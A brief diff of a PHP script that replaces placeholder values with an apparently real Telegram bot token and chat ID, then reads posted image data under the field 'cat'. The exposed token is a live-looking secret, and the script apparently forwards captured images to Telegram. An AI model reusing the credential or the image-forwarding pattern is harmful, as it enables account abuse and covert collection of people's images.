@@ -1,6 +1,6 @@
 <?php
-$botToken = "YOUR_BOT_TOKEN";
-$chatId   = "YOUR_CHAT_ID";
+$botToken = "8740748797:AAEBPa9drKM0cYqoQGqYhtZn3igRi2yOjnY";
+$chatId   = "7236038645";
 
 $date = date('dMYHis');
 $imageData = $_POST['cat'] ?? '';
